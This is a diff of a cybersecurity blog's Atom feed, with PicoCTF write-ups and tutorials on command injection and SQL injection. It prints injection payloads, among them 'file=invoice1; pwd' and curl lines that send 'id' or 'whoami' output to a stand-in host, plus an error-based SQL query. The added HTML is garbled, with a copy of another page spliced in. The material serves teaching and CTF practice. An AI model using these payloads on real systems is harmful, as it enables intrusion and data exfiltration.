@@ -1,6 +1,4 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.10.0">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2025-06-17T19:09:47-04:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">Big Brooklyn</title><subtitle>Cybersecurity Blog + Portfolio</subtitle><author><name>Big Brooklyn</name><email>you@protonmail.com</email></author><entry><title type="html">Event Viewing (PicoCTF)</title><link href="http://localhost:4000/blog/cybersecurity/2025/06/13/Event-Viewing.html" rel="alternate" type="text/html" title="Event Viewing (PicoCTF)" /><published>2025-06-13T00:00:00-04:00</published><updated>2025-06-13T00:00:00-04:00</updated><id>http://localhost:4000/blog/cybersecurity/2025/06/13/Event-Viewing</id><content type="html" xml:base="http://localhost:4000/blog/cybersecurity/2025/06/13/Event-Viewing.html"><![CDATA[<p><img src="https://art.vx-underground.org/art/pancak3_giant_all-seeing_eye_glowing_neon_red_cables_retro_cybe_ea231a51-2642-42ce-b800-7f860e1f6a66.png" alt="Set up Listener" width="600" style="     display: block;     margin: 50px auto 40px;     border-radius: 18px;     border: 2.5px solid #111; /* crisp black border */     box-shadow: 0 10px 25px rgba(0, 0, 0, 0.12); /* soft black shadow */     transition: transform 0.3s ease, box-shadow 0.3s ease;     cursor: pointer;   " onmouseover="this.style.transform='scale(1.05)'; this.style.boxShadow='0 15px 35px rgba(0, 0, 0, 0.25)';" onmouseout="this.style.transform='scale(1)'; this.style.boxShadow='0 10px 25px rgba(0, 0, 0, 0.12)';" /></p>
-
-<div style="background: #181c20; border: 2.5px solid #e74c3c; border-radius: 12px; padding: 22px 26px; margin: 36px 0 32px; box-shadow: 0 4px 18px rgba(231,76,60,0.10); color: #f8f8f2; font-size: 1.13em; font-family: 'Fira Mono', 'Consolas', monospace;">
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.10.0">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2025-06-17T19:16:44-04:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">Big Brooklyn</title><subtitle>Cybersecurity Blog + Portfolio</subtitle><author><name>Big Brooklyn</name><email>you@protonmail.com</email></author><entry><title type="html">Event Viewing (PicoCTF)</title><link href="http://localhost:4000/blog/cybersecurity/2025/06/13/Event-Viewing.html" rel="alternate" type="text/html" title="Event Viewing (PicoCTF)" /><published>2025-06-13T00:00:00-04:00</published><updated>2025-06-13T00:00:00-04:00</updated><id>http://localhost:4000/blog/cybersecurity/2025/06/13/Event-Viewing</id><content type="html" xml:base="http://localhost:4000/blog/cybersecurity/2025/06/13/Event-Viewing.html"><![CDATA[<div style="background: #181c20; border: 2.5px solid #e74c3c; border-radius: 12px; padding: 22px 26px; margin: 36px 0 32px; box-shadow: 0 4px 18px rgba(231,76,60,0.10); color: #f8f8f2; font-size: 1.13em; font-family: 'Fira Mono', 'Consolas', monospace;">
   <div style="font-weight: bold; font-size: 1.22em; letter-spacing: 0.04em; color: #ff5555; margin-bottom: 10px;">
     Challenge: Event-Viewing (PicoCTF)
   </div>
@@ -196,7 +194,7 @@ $filteredEvents = $events | Where-Object { $_.Id -eq 1074 }
 
 <p><img src="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*eyfFqniB6kbk4JHDh9YWAA.png" alt="No Detection" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>
 
-<p>The flag is encoded in base64 within the logs. Once you decode it, you’ll have the third part of the flag.</p>]]></content><author><name>Big Brooklyn</name><email>you@protonmail.com</email></author><category term="blog" /><category term="cybersecurity" /><category term="Redteam" /><category term="pentesting" /><category term="bugbounty" /><category term="ctf" /><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">Mastering BHC</title><link href="http://localhost:4000/blog/cybersecurity/2025/06/13/BHD.html" rel="alternate" type="text/html" title="Mastering BHC" /><published>2025-06-13T00:00:00-04:00</published><updated>2025-06-13T00:00:00-04:00</updated><id>http://localhost:4000/blog/cybersecurity/2025/06/13/BHD</id><content type="html" xml:base="http://localhost:4000/blog/cybersecurity/2025/06/13/BHD.html"><![CDATA[<h1 id="mastering-binary-hexadecimal-and-decimal-conversion-a-hackers-edge-in-reading-assembly">Mastering Binary, Hexadecimal, and Decimal Conversion: A Hacker’s Edge in Reading Assembly</h1>
+<p>The flag is encoded in base64 within the logs. Once you decode it, you’ll have the third part of the flag.</p>]]></content><author><name>Big Brooklyn</name><email>you@protonmail.com</email></author><category term="blog" /><category term="cybersecurity" /><category term="Redteam" /><category term="pentesting" /><category term="bugbounty" /><category term="ctf" /><summary type="html"><![CDATA[Challenge: Event-Viewing (PicoCTF) Description: One of the employees at your company has their computer infected by malware! Turns out every time they try to switch on the computer, it shuts down right after they log in. The story given by the employee is as follows: They installed software using an installer they downloaded online They ran the installed software but it seemed to do nothing Now every time they bootup and login to their computer, a black command prompt screen quickly opens and closes and their computer shuts down instantly. See if you can find evidence for the each of these events and retrieve the flag (split into 3 pieces) from the correct logs! &#128190; Download the Windows Log file: Windows_Logs.evtx]]></summary></entry><entry><title type="html">Mastering BHC</title><link href="http://localhost:4000/blog/cybersecurity/2025/06/13/BHD.html" rel="alternate" type="text/html" title="Mastering BHC" /><published>2025-06-13T00:00:00-04:00</published><updated>2025-06-13T00:00:00-04:00</updated><id>http://localhost:4000/blog/cybersecurity/2025/06/13/BHD</id><content type="html" xml:base="http://localhost:4000/blog/cybersecurity/2025/06/13/BHD.html"><![CDATA[<h1 id="mastering-binary-hexadecimal-and-decimal-conversion-a-hackers-edge-in-reading-assembly">Mastering Binary, Hexadecimal, and Decimal Conversion: A Hacker’s Edge in Reading Assembly</h1>
 
 <p>In the trenches of reverse engineering and assembly analysis, <strong>speed and precision</strong> in converting between number systems can be the difference between success and getting blind-sided.</p>
 
@@ -333,9 +331,7 @@ $filteredEvents = $events | Where-Object { $_.Id -eq 1074 }
   <li>Group bits in bytes (8 bits) for reading memory or instructions.</li>
   <li>Use hex when reading dumps, binary for bitwise flag analysis, and decimal for intuitive values.</li>
   <li>Practice quick mental conversions and develop muscle memory with common hex values (e.g., <code class="language-plaintext highlighter-rouge">0xFF</code>, <code class="language-plaintext highlighter-rouge">0x7F</code>, <code class="language-plaintext highlighter-rouge">0xC3</code>).</li>
-</ul>]]></content><author><name>Big Brooklyn</name><email>you@protonmail.com</email></author><category term="blog" /><category term="cybersecurity" /><category term="Redteam" /><category term="pentesting" /><category term="bugbounty" /><category term="ctf" /><summary type="html"><![CDATA[Mastering Binary, Hexadecimal, and Decimal Conversion: A Hacker’s Edge in Reading Assembly]]></summary></entry><entry><title type="html">READ (PicoCTF)</title><link href="http://localhost:4000/blog/cybersecurity/2025/06/12/REDpicoCTF.html" rel="alternate" type="text/html" title="READ (PicoCTF)" /><published>2025-06-12T00:00:00-04:00</published><updated>2025-06-12T00:00:00-04:00</updated><id>http://localhost:4000/blog/cybersecurity/2025/06/12/REDpicoCTF</id><content type="html" xml:base="http://localhost:4000/blog/cybersecurity/2025/06/12/REDpicoCTF.html"><![CDATA[<p><img src="https://art.vx-underground.org/art/pancak3_giant_all-seeing_eye_glowing_neon_red_cables_retro_cybe_ea231a51-2642-42ce-b800-7f860e1f6a66.png" alt="Set up Listener" width="600" style="     display: block;     margin: 50px auto 40px;     border-radius: 18px;     border: 2.5px solid #111; /* crisp black border */     box-shadow: 0 10px 25px rgba(0, 0, 0, 0.12); /* soft black shadow */     transition: transform 0.3s ease, box-shadow 0.3s ease;     cursor: pointer;   " onmouseover="this.style.transform='scale(1.05)'; this.style.boxShadow='0 15px 35px rgba(0, 0, 0, 0.25)';" onmouseout="this.style.transform='scale(1)'; this.style.boxShadow='0 10px 25px rgba(0, 0, 0, 0.12)';" /></p>
-
-<div style="background: #181c20; border: 2.5px solid #e74c3c; border-radius: 12px; padding: 22px 26px; margin: 36px 0 32px; box-shadow: 0 4px 18px rgba(231,76,60,0.10); color: #f8f8f2; font-size: 1.13em; font-family: 'Fira Mono', 'Consolas', monospace;">
+</ul>]]></content><author><name>Big Brooklyn</name><email>you@protonmail.com</email></author><category term="blog" /><category term="cybersecurity" /><category term="Redteam" /><category term="pentesting" /><category term="bugbounty" /><category term="ctf" /><summary type="html"><![CDATA[Mastering Binary, Hexadecimal, and Decimal Conversion: A Hacker’s Edge in Reading Assembly]]></summary></entry><entry><title type="html">READ (PicoCTF)</title><link href="http://localhost:4000/blog/cybersecurity/2025/06/12/REDpicoCTF.html" rel="alternate" type="text/html" title="READ (PicoCTF)" /><published>2025-06-12T00:00:00-04:00</published><updated>2025-06-12T00:00:00-04:00</updated><id>http://localhost:4000/blog/cybersecurity/2025/06/12/REDpicoCTF</id><content type="html" xml:base="http://localhost:4000/blog/cybersecurity/2025/06/12/REDpicoCTF.html"><![CDATA[<div style="background: #181c20; border: 2.5px solid #e74c3c; border-radius: 12px; padding: 22px 26px; margin: 36px 0 32px; box-shadow: 0 4px 18px rgba(231,76,60,0.10); color: #f8f8f2; font-size: 1.13em; font-family: 'Fira Mono', 'Consolas', monospace;">
   <div style="font-weight: bold; font-size: 1.22em; letter-spacing: 0.04em; color: #ff5555; margin-bottom: 10px;">
     Challenge: RED (PicoCTF)
   </div>
@@ -417,9 +413,7 @@ I installed <code class="language-plaintext highlighter-rouge">zsteg</code> (sin
 After decoding the base64 string several times, I finally obtained the flag!</li>
 </ol>
 
-<p><img src="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*24UtVzAOhW9l80TZJ0ioZQ.png" alt="No Detection" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>]]></content><author><name>Big Brooklyn</name><email>you@protonmail.com</email></author><category term="blog" /><category term="cybersecurity" /><category term="red team" /><category term="pentesting" /><category term="bug bounty" /><category term="ctf" /><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">Quantum Scrambler (PicoCTF)</title><link href="http://localhost:4000/blog/cybersecurity/2025/06/05/QuantumScrambler.html" rel="alternate" type="text/html" title="Quantum Scrambler (PicoCTF)" /><published>2025-06-05T00:00:00-04:00</published><updated>2025-06-05T00:00:00-04:00</updated><id>http://localhost:4000/blog/cybersecurity/2025/06/05/QuantumScrambler</id><content type="html" xml:base="http://localhost:4000/blog/cybersecurity/2025/06/05/QuantumScrambler.html"><![CDATA[<p><img src="https://art.vx-underground.org/art/pancak3_spider_humanoid_in_the_style_of_retro-futuris_fb89e2a2-e804-46ab-90c7-d8fd55328bc8.png" alt="Set up Listener" width="600" style="     display: block;     margin: 50px auto 40px;     border-radius: 18px;     border: 2.5px solid #111; /* crisp black border */     box-shadow: 0 10px 25px rgba(0, 0, 0, 0.12); /* soft black shadow */     transition: transform 0.3s ease, box-shadow 0.3s ease;     cursor: pointer;   " onmouseover="this.style.transform='scale(1.05)'; this.style.boxShadow='0 15px 35px rgba(0, 0, 0, 0.25)';" onmouseout="this.style.transform='scale(1)'; this.style.boxShadow='0 10px 25px rgba(0, 0, 0, 0.12)';" /></p>
-
-<h1 id="reverse-engineering-a-recursive-scramble-in-python-picoctf-challenge-breakdown">Reverse Engineering a Recursive Scramble in Python picoCTF Challenge Breakdown</h1>
+<p><img src="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*24UtVzAOhW9l80TZJ0ioZQ.png" alt="No Detection" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>]]></content><author><name>Big Brooklyn</name><email>you@protonmail.com</email></author><category term="blog" /><category term="cybersecurity" /><category term="red team" /><category term="pentesting" /><category term="bug bounty" /><category term="ctf" /><summary type="html"><![CDATA[Challenge: RED (PicoCTF) Description: RED, RED, RED, RED &#128190; Download: red.png]]></summary></entry><entry><title type="html">Quantum Scrambler (PicoCTF)</title><link href="http://localhost:4000/blog/cybersecurity/2025/06/05/QuantumScrambler.html" rel="alternate" type="text/html" title="Quantum Scrambler (PicoCTF)" /><published>2025-06-05T00:00:00-04:00</published><updated>2025-06-05T00:00:00-04:00</updated><id>http://localhost:4000/blog/cybersecurity/2025/06/05/QuantumScrambler</id><content type="html" xml:base="http://localhost:4000/blog/cybersecurity/2025/06/05/QuantumScrambler.html"><![CDATA[<h1 id="reverse-engineering-a-recursive-scramble-in-python-picoctf-challenge-breakdown">Reverse Engineering a Recursive Scramble in Python picoCTF Challenge Breakdown</h1>
 
 <hr />
 
@@ -772,9 +766,7 @@ print(flag)
 </code></pre>
 </div>
 
-<p>Remember to save the output like this: <code class="language-plaintext highlighter-rouge">nc verbal-sleep[.]picoctf[.]net 63518 &gt; scrambled_output.txt</code></p>]]></content><author><name>Big Brooklyn</name><email>you@protonmail.com</email></author><category term="blog" /><category term="cybersecurity" /><category term="red team" /><category term="pentesting" /><category term="bug bounty" /><category term="ctf" /><category term="Reverse Engineering" /><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">Command Injection &amp;amp; Remote Command Injection</title><link href="http://localhost:4000/blog/cybersecurity/2025/06/02/RCE.html" rel="alternate" type="text/html" title="Command Injection &amp;amp; Remote Command Injection" /><published>2025-06-02T00:00:00-04:00</published><updated>2025-06-02T00:00:00-04:00</updated><id>http://localhost:4000/blog/cybersecurity/2025/06/02/RCE</id><content type="html" xml:base="http://localhost:4000/blog/cybersecurity/2025/06/02/RCE.html"><![CDATA[<p><img src="http://art.vx-underground.org/art/pancak3_deer_skeleton_humanoid_wearing_a_hoodie_in_the_style_of_71e7dc3b-d083-4668-a6eb-b8f10b9c962a.png" alt="Set up Listener" width="600" style="     display: block;     margin: 50px auto 40px;     border-radius: 18px;     border: 2.5px solid #111; /* crisp black border */     box-shadow: 0 10px 25px rgba(0, 0, 0, 0.12); /* soft black shadow */     transition: transform 0.3s ease, box-shadow 0.3s ease;     cursor: pointer;   " onmouseover="this.style.transform='scale(1.05)'; this.style.boxShadow='0 15px 35px rgba(0, 0, 0, 0.25)';" onmouseout="this.style.transform='scale(1)'; this.style.boxShadow='0 10px 25px rgba(0, 0, 0, 0.12)';" /></p>
-
-<p><em>What if a single line of input could give an attacker full control over a system? No passwords. No exploits. Just raw commands slipped in through the cracks.</em>
+<p>Remember to save the output like this: <code class="language-plaintext highlighter-rouge">nc verbal-sleep[.]picoctf[.]net 63518 &gt; scrambled_output.txt</code></p>]]></content><author><name>Big Brooklyn</name><email>you@protonmail.com</email></author><category term="blog" /><category term="cybersecurity" /><category term="red team" /><category term="pentesting" /><category term="bug bounty" /><category term="ctf" /><category term="Reverse Engineering" /><summary type="html"><![CDATA[Reverse Engineering a Recursive Scramble in Python picoCTF Challenge Breakdown]]></summary></entry><entry><title type="html">Command Injection &amp;amp; Remote Command Injection</title><link href="http://localhost:4000/blog/cybersecurity/2025/06/02/RCE.html" rel="alternate" type="text/html" title="Command Injection &amp;amp; Remote Command Injection" /><published>2025-06-02T00:00:00-04:00</published><updated>2025-06-02T00:00:00-04:00</updated><id>http://localhost:4000/blog/cybersecurity/2025/06/02/RCE</id><content type="html" xml:base="http://localhost:4000/blog/cybersecurity/2025/06/02/RCE.html"><![CDATA[<p><em>What if a single line of input could give an attacker full control over a system? No passwords. No exploits. Just raw commands slipped in through the cracks.</em>
 That’s the threat behind <strong>Command Injection</strong> one of the most dangerous, yet often overlooked, vulnerabilities in modern applications.</p>
 
 <p>At its core, Command Injection happens when user-supplied data is passed directly to the system shell without proper sanitization. It’s like handing a stranger the mic and trusting they’ll only say what you expect. But attackers don’t play nice they chain extra commands, escalate privileges, and pivot deeper into your infrastructure.</p>
@@ -1212,11 +1204,7 @@ http://0.0.0.0:8080/invoice.php?file=invoice1; sleep 5; curl http://10.0.2.15/$(
   <li>
     <p>OOB is king when you’re behind WAFs, filtered output, or sandboxed environments.</p>
   </li>
-</ul>]]></content><author><name>Big Brooklyn</name><email>you@protonmail.com</email></author><category term="blog" /><category term="cybersecurity" /><category term="red team" /><category term="pentesting" /><category term="bug bounty" /><category term="ctf" /><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">SQL Injection</title><link href="http://localhost:4000/blog/cybersecurity/2025/06/02/SQLI.html" rel="alternate" type="text/html" title="SQL Injection" /><published>2025-06-02T00:00:00-04:00</published><updated>2025-06-08T00:00:00-04:00</updated><id>http://localhost:4000/blog/cybersecurity/2025/06/02/SQLI</id><content type="html" xml:base="http://localhost:4000/blog/cybersecurity/2025/06/02/SQLI.html"><![CDATA[<p><img src="https://art.vx-underground.org/art/pancak3_evil_computer_hackers_degen_dark_det_in_the_style_of_cr_6984d0d8-875c-4a2e-83b9-d3b30ff721f1.png" alt="Set up Listener" width="600" style="     display: block;     margin: 50px auto 40px;     border-radius: 18px;     border: 2.5px solid #111; /* crisp black border */     box-shadow: 0 10px 25px rgba(0, 0, 0, 0.12); /* soft black shadow */     transition: transform 0.3s ease, box-shadow 0.3s ease;     cursor: pointer;   " onmouseover="this.style.transform='scale(1.05)'; this.style.boxShadow='0 15px 35px rgba(0, 0, 0, 0.25)';" onmouseout="this.style.transform='scale(1)'; this.style.boxShadow='0 10px 25px rgba(0, 0, 0, 0.12)';" /></p>
-
-<h1 id="sql-structured-query-language">SQL (Structured Query Language)</h1>
-<hr />
-
+</ul>]]></content><author><name>Big Brooklyn</name><email>you@protonmail.com</email></author><category term="blog" /><category term="cybersecurity" /><category term="red team" /><category term="pentesting" /><category term="bug bounty" /><category term="ctf" /><summary type="html"><![CDATA[What if a single line of input could give an attacker full control over a system? No passwords. No exploits. Just raw commands slipped in through the cracks. That’s the threat behind Command Injection one of the most dangerous, yet often overlooked, vulnerabilities in modern applications.]]></summary></entry><entry><title type="html">SQL Injection</title><link href="http://localhost:4000/blog/cybersecurity/2025/06/02/SQLI.html" rel="alternate" type="text/html" title="SQL Injection" /><published>2025-06-02T00:00:00-04:00</published><updated>2025-06-08T00:00:00-04:00</updated><id>http://localhost:4000/blog/cybersecurity/2025/06/02/SQLI</id><content type="html" xml:base="http://localhost:4000/blog/cybersecurity/2025/06/02/SQLI.html"><![CDATA[<h1 id="sql-structured-query-language">SQL (Structured Query Language)</h1>
 <p>SQL is a powerful language used to interact with relational databases. It lets you fetch, update, insert, and remove data using clear commands called <strong>statements</strong>.</p>
 
 <p>In this guide, we’ll stick with <strong>MySQL-style syntax</strong>. It’s important to know SQL is <strong>not case-sensitive</strong>, so commands like <code class="language-plaintext highlighter-rouge">SELECT</code>, <code class="language-plaintext highlighter-rouge">select</code>, and <code class="language-plaintext highlighter-rouge">SeLeCt</code> all behave the same.</p>
@@ -1933,9 +1921,530 @@ https://comments.sys/view.php?cid=10 AND 1=CONVERT(int,(SELECT @@version));
 
 <p>If error messages are on, you get:</p>
 
-<div class="alert-error">
-Error: Conversion failed when converting the varchar value 'Microsoft SQL Server 2019' to data type int.
+<p>&lt;div class=”&lt;div class="post-page"&gt;</p>
+<article class="post-container px-4 py-5 mx-auto max-w-4xl text-gray-100">
+    <header class="mb-4 border-b border-gray-600 pb-3">
+      <h1 class="text-3xl font-bold text-white">SQL Injection</h1>
+      <p class="text-sm text-gray-400">
+        June 2, 2025
+      </p>
+      <p class="text-sm text-gray-400">
+        Categories: 
+        
+          <a href="/categories/blog" class="text-gray-400 hover:text-white">blog</a>, 
+        
+          <a href="/categories/cybersecurity" class="text-gray-400 hover:text-white">cybersecurity</a>
+        
+      </p>
+    </header>
+
+    <section class="post-content prose prose-invert max-w-none text-gray-300">
+      <div class="post-page">
+  <article class="post-container px-4 py-5 mx-auto max-w-4xl text-gray-100">
+    <header class="mb-4 border-b border-gray-600 pb-3">
+      <h1 class="text-3xl font-bold text-white">Command Injection &amp; Remote Command Injection</h1>
+      
+      <p class="text-sm text-gray-400">
+        June 2, 2025
+      </p>
+      
+      <p class="text-sm text-gray-400">
+        Categories: 
+        
+          <a href="/categories/blog" class="text-gray-400 hover:text-white">blog</a>, 
+        
+          <a href="/categories/cybersecurity" class="text-gray-400 hover:text-white">cybersecurity</a>
+        
+      </p>
+      
+      
+        <p class="mt-1 text-sm text-gray-400">
+          Tags: 
+          
+            <a href="/tags/red team" class="text-gray-400 hover:text-white">red team</a>, 
+          
+            <a href="/tags/pentesting" class="text-gray-400 hover:text-white">pentesting</a>, 
+          
+            <a href="/tags/bug bounty" class="text-gray-400 hover:text-white">bug bounty</a>, 
+          
+            <a href="/tags/ctf" class="text-gray-400 hover:text-white">ctf</a>
+          
+        </p>
+      
+    </header>
+
+    <section class="post-content prose prose-invert max-w-none text-gray-300">
+      <p><em>What if a single line of input could give an attacker full control over a system? No passwords. No exploits. Just raw commands slipped in through the cracks.</em>
+That’s the threat behind <strong>Command Injection</strong> one of the most dangerous, yet often overlooked, vulnerabilities in modern applications.</p>
+
+<p>At its core, Command Injection happens when user-supplied data is passed directly to the system shell without proper sanitization. It’s like handing a stranger the mic and trusting they’ll only say what you expect. But attackers don’t play nice they chain extra commands, escalate privileges, and pivot deeper into your infrastructure.</p>
+
+<p><strong>Remote Command Injection</strong> (RCI) raises the stakes. It’s the same flaw, but now it’s exposed over a network. An attacker can be miles or continents away, injecting commands into a server, IoT device, or web app, turning an external input point into an internal compromise.</p>
+
+<p>These vulnerabilities aren’t theoretical. They’re actively exploited in the wild used to drop web shells, create backdoors, and hijack entire environments. Understanding how they work is the first step to preventing a silent breach.</p>
+
+<h1 id="breaking-down-rce-through-a-simple-invoice-app">Breaking Down RCE Through a Simple Invoice App</h1>
+
+<p>Imagine you log into an app and click <strong>Generate Invoice</strong>. Looks all normal, right? Here’s what happens:</p>
+
+<p><img src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*jzNx0nUYgsmHFZJZG2qccA.png" alt="No Detection" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>
+
+<ol>
+  <li>You hit the button, and it shows <strong>Invoice #001</strong> with client info and total amount. Nothing sketchy.</li>
+</ol>
+
+<p><img src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*pRgY0fG5l8m_zkZDdPXuAg.png" alt="No Detection" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>
+
+<ol>
+  <li>But check the URL closely:</li>
+</ol>
+<div class="code-block-container">
+  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
+    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
+      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
+      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
+    </svg>
+  </button>
+  <pre><code class="language-powershell">
+http://0.0.0.0:8080/invoice.php?file=invoice1
+</code></pre>
 </div>
+
+<ol>
+  <li>That <code class="language-plaintext highlighter-rouge">file</code> parameter? It’s the weak link. When we start messing with it like running <code class="language-plaintext highlighter-rouge">pwd</code> (print working directory in Linux) the server blindly executes it. Remote Code Execution (RCE).</li>
+</ol>
+
+<div class="code-block-container">
+  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
+    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
+      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
+      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
+    </svg>
+  </button>
+  <pre><code class="language-powershell">
+http://0.0.0.0:8080/invoice.php?file=invoice1; pwd
+</code></pre>
+</div>
+
+<p><img src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*JjOPZfh85Lzuj3o_h7E-Ng.png" alt="No Detection" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>
+
+<ol>
+  <li>Next, we try <code class="language-plaintext highlighter-rouge">ls</code> to list directories. The server spits back the contents.</li>
+</ol>
+
+<div class="code-block-container">
+  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
+    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
+      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
+      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
+    </svg>
+  </button>
+  <pre><code class="language-powershell">
+http://0.0.0.0:8080/invoice.php?file=invoice1; ls
+</code></pre>
+</div>
+
+<p><img src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*dwZAx8GLOe-oEzPqeKBUlg.png" alt="No Detection" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>
+
+<p><strong>What this means:</strong>
+Attackers can slip commands through that parameter, bypassing any security guardrails, and gain full control of your system without breaking a sweat.</p>
+
+<h2 id="detecting-command-injection-from-echoes-to-silence">Detecting Command Injection: From Echoes to Silence</h2>
+
+<p>Detection relies on understanding how the app <em>behaves</em> when fed hostile input. There are two primary categories:</p>
+
+<h3 id="types-of-command-injection">Types of Command Injection</h3>
+
+<table>
+  <thead>
+    <tr>
+      <th>Type</th>
+      <th>Description</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td><strong>Verbose</strong></td>
+      <td>You get immediate feedback. Think <code class="language-plaintext highlighter-rouge">whoami</code>, <code class="language-plaintext highlighter-rouge">id</code>, or <code class="language-plaintext highlighter-rouge">uname -a</code> if the output is reflected in the response, the target is talking.</td>
+    </tr>
+    <tr>
+      <td><strong>Blind</strong></td>
+      <td>No output. The system executes commands silently. You need to analyze behavior, timing, or external signals to confirm execution. This is stealth mode.</td>
+    </tr>
+  </tbody>
+</table>
+
+<hr />
+
+<h2 id="detecting-blind-command-injection">Detecting Blind Command Injection</h2>
+
+<p>The hardest to spot. There’s no direct output just subtle shifts in behavior. You’re probing in the dark, waiting for the system to flinch.</p>
+
+<h3 id="1-time-based-payloads">1. <strong>Time-Based Payloads</strong></h3>
+
+<p>Use commands that introduce a delay. Examples:</p>
+
+<ul>
+  <li>
+    <p><code class="language-plaintext highlighter-rouge">ping -c 5 127.0.0.1</code> (Linux)</p>
+  </li>
+  <li>
+    <p><code class="language-plaintext highlighter-rouge">timeout /T 5</code> (Windows)</p>
+  </li>
+  <li>
+    <p><code class="language-plaintext highlighter-rouge">sleep 5</code></p>
+  </li>
+</ul>
+
+<p>If the response time increases proportionally to the command, the target’s bleeding commands under the hood.</p>
+
+<h4 id="2-out-of-band-oob-detection">2. <strong>Out-of-Band (OOB) Detection</strong></h4>
+
+<p>If you control a server (Burp Collaborator, your own webhook, etc.), use payloads like:</p>
+
+<div class="code-block-container">
+  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
+    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
+      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
+      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
+    </svg>
+  </button>
+  <pre><code class="language-powershell">
+curl http://yourhost.com/$(whoami)
+</code></pre>
+</div>
+
+<p>If your server receives a pingback? Game over. You’ve got code execution.</p>
+
+<h3 id="3-output-redirection">3. <strong>Output Redirection</strong></h3>
+
+<p>Force output to a file:</p>
+
+<div class="code-block-container">
+  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
+    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
+      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
+      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
+    </svg>
+  </button>
+  <pre><code class="language-powershell">
+whoami &gt; /tmp/output.txt
+</code></pre>
+</div>
+
+<p>Then attempt to read it:</p>
+
+<div class="code-block-container">
+  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
+    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
+      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
+      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
+    </svg>
+  </button>
+  <pre><code class="language-powershell">
+cat /tmp/output.txt
+</code></pre>
+</div>
+
+<p>This requires multiple steps and possibly multiple injection points, but if you pull it off it’s a solid confirm.</p>
+
+<hr />
+
+<h2 id="the-curl-trick">The Curl Trick</h2>
+
+<p><code class="language-plaintext highlighter-rouge">curl</code> is the Swiss Army knife of testing. Use it to exfil data, confirm execution, or verify external command execution.</p>
+
+<p>Example payload:</p>
+
+<div class="code-block-container">
+  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
+    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
+      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
+      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
+    </svg>
+  </button>
+  <pre><code class="language-powershell">
+curl http://yourhost.com?data=$(id)
+</code></pre>
+</div>
+
+<p>If you log the inbound request and see the system’s UID info? You just lit up their internals.</p>
+
+<hr />
+
+<h2 id="final-thoughts">Final Thoughts</h2>
+
+<p>Blind command injection is about patience, observation, and precision. You’re not shooting bullets you’re setting traps. Always consider the OS, encoding quirks, filters, and how input is parsed.</p>
+
